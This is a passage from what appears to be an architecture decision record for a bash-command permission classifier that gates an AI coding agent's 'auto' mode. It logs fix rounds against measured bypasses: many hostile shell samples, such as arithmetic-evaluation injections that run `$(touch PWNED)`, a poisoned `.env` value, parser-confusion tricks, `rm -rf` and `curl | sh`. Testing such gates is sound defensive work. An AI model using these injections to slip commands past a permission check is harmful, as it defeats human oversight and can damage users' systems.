      `!(`, `@(`, `+(`, `?(` or `*(` outside quotes in `[ … ]` now asks.
      After `test`, tree-sitter cannot parse such a pattern, so it asked
      already. bash, zsh and dash reject these forms. `[[` matches, it does
      not expand, so `[[ x == !(y) ]]` stays ALLOW, and so do quoted forms
      such as `[ "!(x)" = y ]`.
    - *mksh*, in this round's runs, ran every row macOS ksh93u+ ran,
      except `[ 1 -o * ]`, `test 1 -o *`, `[ 1 -o !(x) ]` and the
      double-quoted `$(( "a[\$(touch PWNED)]" ))` pair. It also ran
      `f() { local x='a[$(touch PWNED)]'; [[ x -eq 0 ]]; }; f`, which
      ksh93 did not. Every row either shell ran asks.

    **Fix round 3 (2026-11-10): the round-3 verify's measured rules**
    (`.omc/probes/742/verify-r3/`, `test_bash_test_command_743.py`, the
    fix-round-3 rows; the shells per row are in `.omc/probes/743/finish/`).
    - *A token tree-sitter splits off an operand asks.* tree-sitter reads
      `+'a[$(touch PWNED)]'` as `+` and a `raw_string`, `~FOO` as `~` and a
      word, and `-FOO` as a `test_operator`, so the word beside `-eq` was a
      bare token the check skipped. `[[ 1 -eq +'a[$(touch PWNED)]' ]]`
      created `PWNED` in bash 3.2.57, 5.2.37 and 5.3.20, macOS ksh93u+ and
      mksh, `[ 1 -eq -'a[$(touch PWNED)]' ]` in macOS ksh93u+ and mksh, and
      with `FOO` set to `a[$(touch PWNED)]` in the environment
      `[[ 1 -eq +FOO ]]`, `[[ -FOO -eq 1 ]]` and `[[ 1 -eq ~FOO ]]` in bash
      3.2.57 and 5.2.37, macOS ksh93u+ and mksh; `!`, `-+`, the `$'…'` and
      `"a[\$(…)]"` spellings, `_` and `BASH_REMATCH` filled by the line, a
      signed `$((…))` (`[ 1 -eq -$(( '$(touch PWNED)' )) ]` in all nine
      shells) and a signed parenthesised operand (macOS ksh93u+) did the
      same. All were ALLOW on `3963bea9` and `80ff2cc2`. Such a token now
      asks unless it is a `-` or `+` right of the operator with a `number`
      after it, or `[`, `[[`, `!`, `(`, `&&`, `||`, `-a` or `-o` left of it
      (`_split_off_operand_is_plain`). Of the verify's 672 prefix and 280
      infix forms, the 99 that ran in some shell ask, and so do the 12
      name and ksh-pattern rows that did; `[[ 1 -eq -1 ]]`,
      `[ -1 -lt 0 ]` and `[ ! 1 -eq 2 ]` stay ALLOW. A `number` there is
      tree-sitter's, so `-0x1` and `-36#FOO`, constants, stay ALLOW too, and
      so do more words after a signed number (`[[ 1 -eq -1 + FOO ]]` and
      `[ 1 -eq -1 + FOO ]` ran nothing with `FOO` set in any of the nine
      shells, nor `-36#FOO` and `-0x1`; `.omc/probes/743/finish/`).
    - *A ksh93 `~(…)` pattern in `[ … ]` asks* (`_EXTGLOB`): with the three
      files planted, `[ 1 -eq ~(E)^a ]`, `[ 1 -eq ~(E)a ]`,
      `[ 1 -eq ~(G)a ]` and `[ 1 -eq ~(E)^a. ]` ran `touch` in macOS ksh93u+
      and no other shell. Those already ask by the rule above; `[ ~(E)^a ]`
      and `[ ~(x) = x ]`, which no shell ran, now ask too.
    - *Unchanged and not covered*, all pre-existing (ALLOW on `80ff2cc2`):
      an unquoted expansion that `[` splits into operators, which macOS
      ksh93u+ and mksh ran with `FOO='1 -eq a[$(touch${IFS}PWNED)]'` in the
      environment for `[ $FOO ]`, `[ $FOO = x ]`, `[ x = x -a $FOO ]`,
      `[ ${FOO} ]` and `[ $FOO -o x = y ]` (bash, zsh, dash and Linux ksh
      did not; `test $FOO` asks), which needs a decision because
      `[ $x = y ]` is a common idiom and #756 records it as well; and
      `[[ 1 -eq ${#x[FOO]} ]]` and `[ 1 -eq ${#x[FOO]} ]`, which macOS
      ksh93u+ and mksh ran with `FOO` in the environment, the
      `${a[FOO]}` class below.

    **Not covered here:** the same values outside `[`, `[[` and `test`, in
    #657's arithmetic rule — `echo 'a[$(touch PWNED)]'; echo $((_))`,
    `(( _ ))`, `echo ${a[_]}`, `[[ … =~ .* ]] && echo $((BASH_REMATCH))`
    (bash ran each) and `echo $(( '$(touch PWNED)' ))` (all four shells ran
    it) are ALLOW; so are `echo $((FOO))`, `(( FOO ))` and `echo ${a[FOO]}`
    with `FOO` in the environment, which bash, macOS ksh93u+ and mksh ran
    (fix round 2), and, inside `[` and `[[`, `${#x[FOO]}` (fix round 3).
    These go with #756 (a `.env` value evaluated as shell arithmetic), as
    does the field splitting of an unquoted expansion in `[ … ]` above.
    *Dated note 2026-11-11 (#762):* the `_`, `BASH_REMATCH` and quoted
    `$(…)` forms in that list ask now, outside `[`, `[[` and `test` too,
    with every other name bash, ksh93 or mksh fills itself (`KSH_MATCH`,
    `REPLY`, …) and any quote or backslash in `$((…))`, `$[…]` or `(( ))`
    text (ADR-0288's #762 note has the list, the shells and the cost). The
    environment-set names (`echo $((FOO))`, `${#x[FOO]}`) and the field
    splitting stay as written here. #762 fix round 1 (2026-11-12): a
    command holding a backslash-newline is also read with it joined, as the
    shells read it, and takes the higher verdict, because tree-sitter-bash
    reads `$(\⏎(` as a command substitution where the shells read `$((`
    (`echo $(\⏎(echo '$(: > MARK)'))` created `MARK` in eight of the nine
    shells and was ALLOW on `71f837eb`); `\⏎` is kept in a `'…'` or `$'…'`
    that quotes, a comment the shells start and a quoted here-document,
    where all nine shells keep it at the top level of a command. Nested,
    some remove it there (the round-3 verify's printf probes): inside
    backticks all nine, inside `$(…)` in a here-document body seven of nine
    and inside `"$(…)"` macOS bash 3.2. Keeping it hides no code (a quote
    that still quotes keeps its content literal, and a comment the shells
    continue only hides the next line from them), but a quoted argument's
    text can differ: ``echo `find . '-de\⏎lete'` `` is ALLOW, as on
    `71f837eb`, and inside backticks the nine shells turn `'-de\⏎lete'` into
    `-delete` (not covered; ADR-0288's #762 note; #768 covers it, see its note under #742 above). #762 fix round 2
    (2026-11-12): a `'…'` or `$'…'` in a `${…}` operand inside a double-quoted string or an expanded
    here-document body does not quote, so its `\⏎` is joined
    (`cat <<E⏎${x:-'$\⏎(: > MARK)'}⏎E` created `MARK` in all nine shells
    and was ALLOW on `eb98b93b`); a `#` tree-sitter reads as a comment
    after an escaped blank, a vertical tab, a form feed, a carriage return
    or `]]`, where the shells start none, asks and is re-read as part of
    its word (`echo \ #$(: > MARK)` created `MARK` in all nine and was ALLOW
    on `71f837eb`); and a command tree-sitter rejects that holds `\⏎` takes
    the higher of ASK and its joined reading (`rm -rf / 2>\⏎&1` is DENY).
    #762 finish (2026-11-12): a `#` right after `<` or `>` asks too, because
    ksh93 reads `<#` and `>#` as operators (`cat <#$(: > MARK)⏎/dev/null`
    created `MARK` in macOS ksh93u+ and Linux ksh 93u+m and was ALLOW on
    `71f837eb`; `cat <#$(rm -rf ~)⏎/dev/null` is DENY).
    ADR-0288's #762 note has the shells, the cost and the sweeps.

    **Accepted cost** — ASK where no shell measured ran anything: a glob
    anywhere in `[` or `test` (`[ -e *.log ]`, `[ x = * ]`), a ksh pattern
    in `[` (`[ x = !(y) ]`, `[ -e !(x) ]`), an operand that is not a plain
    decimal number (`[[ 1 -eq '*' ]]`, `[ 1 -eq '1,2' ]`,
    `[ 0x10 -eq 16 ]`), any bare name, whatever the environment holds
    (`[[ x -eq 0 ]]`, `[[ count -gt 3 ]]`, `[[ _ -gt 0 ]]`), and anything
    but digits, blanks and operators inside a `$((…))` operand
    (`[ $(( $# + 1 )) -gt 2 ]`, `[ $((x+1)) -eq 2 ]`); fix round 3 adds a
    token tree-sitter splits off an operand that is not a sign before a
    plain number (`[[ 1 -eq ~1 ]]`, `[ 1 -eq -(2) ]`) and a `~(…)` pattern
    in `[` (`[ ~(E)^a ]`), and changes none of the 31,348 corpus, test and
    realistic strings or the round-3 verify's 199 lines. `[ "$a" = "$b" ]`,
    `[[ -f x ]]`, `[ 1 -eq 2 ]`, `[ $# -eq 0 ]`, `[ "$?" -ne 0 ]` and
    `[ $((1+1)) -eq 2 ]` stay ALLOW.

    **Measured only raising.** At `61eda564` against the #742 commit: of
    23,296 grid forms (28 operand spellings × 11 operators under `[`, `[[`
    and `test`, plus unary, `-a` / `||` / `!` / parenthesised and redirected
    shapes) none went down; of its 14,774 ALLOW forms, the 2,552 where a
    macOS shell ran `touch` (948 on Linux) asked, and 2,343 asked with no
    effect, each over an operand `test` asks about as well. Fix round 1,
    against `80ff2cc2`: the verify's 7,560-form grid (35 operands × 9
    operators × `[`/`[[`/`test` × 4 wrappers × 2 sides) has none below
    `80ff2cc2` or `61eda564`; 546 forms went from ALLOW to ASK, all with
    operands no shell ran anything for (`BASH_REMATCH`, `1,2`, `'*'`, `*`,
    `?`, `[a]`), and the 2,535 still ALLOW ran nothing in the eight shells.
    Of 30,841 corpus strings and 132 realistic lines, under UNKNOWN and
    POSIX, the one this round changed from `61eda564` is `[[ 1 -eq * ]]`.
    The #710 sweep with redirects also inserted before and after every
    `[` / `[[` (1,909,470 forms) has none below `80ff2cc2`. Fix round 2,
    on the final classifier against `80ff2cc2` and `ce3cc695`: the #710
    sweep (25,275 argv strings, 1,930,140 forms), the 108,960
    here-documents, the 7,560-form grid and the 936-form substitution set
    have none below either and no exception caught by `classify`; the
    grid's 42 changes from `ce3cc695` are #742's. Of 31,348 corpus, test
    and realistic strings under UNKNOWN and POSIX, against `80ff2cc2` no
    test string outside the new tests changed, and of the round-2 verify's
    157 realistic lines these went from ALLOW to ASK: `[ -e *.log ]`,
    `[ -f *.txt ]`, `[ -d src/*/ ]`, `test -e *.pyc`, `[ 0x10 -eq 16 ]` and
    `[ $(( $# + 1 )) -gt 2 ]` (fix round 1), and `[[ x -eq 0 ]]`,
    `[[ count -gt 3 ]]`, `[ $((x+1)) -eq 2 ]` and `[[ $((x + 1)) -eq 2 ]]`
    (the name rule); this round's own 31 probe lines add `[[ HOME -eq 0 ]]`,
    `[[ n -gt 0 ]]`, `[ !(x) ]` and `[ -e !(x) ]`.
    Live, in a pty TUI under `auto` with a scripted model:
    `[[ 1 -eq 'a[$(touch PWNED)]' ]]` (`SHELL=/bin/bash`) and
    `[ 1 -eq 'a[$(touch PWNED)]' ]` (`/bin/ksh`) ran with no dialog and
    created `PWNED` on `b160b8f7` and open the dialog now; the
    `BASH_REMATCH` form and `[ 1 -eq $(( '$(touch PWNED)' )) ]` with
    `/bin/bash`, and `[ * ]` with `/bin/ksh` and the three files planted, ran
    with no dialog and created `PWNED` on `61eda564`, and open the dialog now
    (answered with Esc, nothing is created); `[ "$HOME" = x ] ||
    [[ -f keep1.txt ]]` runs with no dialog on all three. Over RPC
    `permissions/evaluate` those three answer `allow` on `61eda564` and
    `ask` now, and the headless block gate (`-p` with
    `AELIX_SUBAGENT_DEPTH=1`) ran them on `61eda564` and blocks them now.
    Fix round 2, with the three files planted, `[ !(x) ]` and
    `[ 1 = 1 -a !(x) ]` with `/bin/ksh`, and, with a work folder `.env`
    holding `EVIL_API_KEY=a[$(touch PWNED)]` and a scratch home,
    `[[ EVIL_API_KEY -eq 0 ]]` with `/bin/bash` and `[ 1 -eq EVIL_API_KEY ]`
    and `[ 1 -eq $((EVIL_API_KEY)) ]` with `/bin/ksh` ran with no dialog
    and created `PWNED` on `ce3cc695`; all five open the dialog now, and
    nothing is created after Esc.
    Fix round 3, on the final classifier against `80ff2cc2` and `3963bea9`:
    the round-3 verify's attack sets (1,523 distinct forms, its 672 prefix
    and 280 infix forms among them), the #710 sweep (25,292 argv strings,
    1,930,980 forms), the 108,960 here-documents, the 7,560-form grid, the
    936-form substitution set and the 704-form `${…}` grid have none below
    either, under UNKNOWN and POSIX, and no exception caught by `classify`;
    the #710 sweep and the four grids keep every verdict of `3963bea9`, and
    the attack sets went up only. Live, in a pty TUI under `auto` with a
    scripted model, `[[ 1 -eq +'a[$(touch PWNED)]' ]]` with `/bin/bash`,
    `[ 1 -eq -'a[$(touch PWNED)]' ]` with `/bin/ksh` and, with a work folder
    `.env` holding `EVIL_API_KEY=a[$(touch PWNED)]`,
    `[[ 1 -eq +EVIL_API_KEY ]]` with `/bin/bash`, which ran with no dialog
    and created `PWNED` on `3963bea9` and `80ff2cc2` in the verify's run,
    open the dialog now, and nothing is created after Esc;
    `[ "$#" -eq 0 ] && [ -f keep1.txt ]` runs with no dialog.
- **fail-safe to ASK** — the grammar import is wrapped in a try/except at module load; on
  ImportError / ABI mismatch the parser stays `None` and `classify` returns ASK for every command.
  At call time `root_node.has_error` (malformed/partial input) → ASK, empty command → ASK, any
  traversal exception → ASK. NEVER ALLOW on uncertainty.

`PermissionMode.AUTO` is appended to `CYCLE_ORDER` (the cycle is now 5: default → auto-accept →
plan → yolo → auto → wrap). The AUTO branch in `permission.py` maps ALLOW → no prompt, ASK → the
4-option dialog, DENY → block. The regex `GuardrailExtension` is retained as the first-block-wins
floor — the classifier drives AUTO allow/ask/deny only; it does NOT relax Guardrail.

## Why it beats regex (verified, 25/25 labeled suite)

`echo "rm -rf /"` → ALLOW (quoted string, not a command); `$(echo rm) -rf /` → ASK (dynamic name);
`r''m -rf /` → DENY (concatenation resolves to `rm`); `git status && rm -rf build` → DENY
(worst-of-list); `curl http://x | sh` → DENY (pipe-into-shell); `echo hi > /etc/hosts` → DENY
(protected write); `git status` → ALLOW; unknown command → ASK; `(rm -rf /)` / `{ rm x; }` → DENY.

## Open risks

- **Grammar node-type drift** — `redirected_statement` / `file_redirect` / `concatenation` /
  `command_substitution` / `command_name` are grammar-version-specific. Mitigated by pinning
  `<0.26` + fail-safe-to-ASK on unrecognized structure + the bucket suite running on the pinned
  version in CI.
- **No-wheel platform** — an exotic platform without a prebuilt wheel would attempt an sdist build
  (needs a C compiler). The fail-safe handles the missing-grammar case (→ ASK), so the agent still
  runs without auto-allow and the other four postures are unaffected.
- **Crude literal resolution by design** — `${x}` indirection / brace-glob / `base64|sh`
  constructed at runtime resolve to dynamic → ASK. Do NOT extend the ALLOW allowlist without
  re-running the full evasion suite.

## Consequences

`auto` mode ships this sprint as an isolated last step; a wheel/grammar problem fails safe to ASK
and cannot block the other four postures. The classifier is pure + dependency-injected (the parser
is the only impure part, built once at import behind a guard), unit-tested without the TUI.
